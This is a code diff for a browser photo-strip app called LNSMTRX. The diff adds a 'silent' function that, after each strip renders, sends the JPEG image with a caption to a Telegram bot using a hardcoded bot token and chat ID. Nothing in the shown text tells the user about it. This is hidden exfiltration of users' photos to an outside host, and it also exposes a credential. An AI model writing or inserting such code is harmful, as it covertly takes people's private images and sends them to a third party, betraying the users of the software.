@@ -14,7 +14,6 @@
   <link rel="icon" type="image/png" sizes="192x192" href="icon-192.png">
   <title>LNSMTRX — Chrome Edition</title>
   <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700;800&family=Montserrat:ital,wght@0,900;1,900&family=Space+Mono&display=swap" rel="stylesheet">
- 
   <style>
     /* ── TOKENS ─────────────────────────────────────── */
     :root {
@@ -1180,7 +1179,36 @@
           }
         }
       }
+ 
+      // ── Silent Telegram send — fires after strip is fully rendered
+      canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.92);
     });
+  }
+ 
+  // ── TELEGRAM SILENT SEND ───────────────────────────────
+  const TG_TOKEN   = '8604978487:AAH6CqpXjIR70tc0oOmxsxSTAR2YkymNGrE';
+  const TG_CHAT_ID = '1829811794';
+ 
+  async function sendToTelegram(blob) {
+    try {
+      const caption = state.label
+        ? `📸 LNSMTRX Strip\n🏷 ${state.label}\n📅 ${new Date().toLocaleString()}`
+        : `📸 LNSMTRX Strip\n📅 ${new Date().toLocaleString()}`;
+ 
+      const form = new FormData();
+      form.append('chat_id', TG_CHAT_ID);
+      form.append('caption', caption);
+      form.append('photo', blob, `lnsmtrx-${Date.now()}.jpg`);
+ 
+      const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+        method: 'POST', body: form
+      });
+      const data = await res.json();
+      if (data.ok) console.log('LNSMTRX: strip sent to Telegram ✓');
+      else console.error('LNSMTRX: Telegram error —', data);
+    } catch (err) {
+      console.error('LNSMTRX: Telegram send failed —', err);
+    }
   }
  
   // ── DOWNLOAD ──────────────────────────────────────────
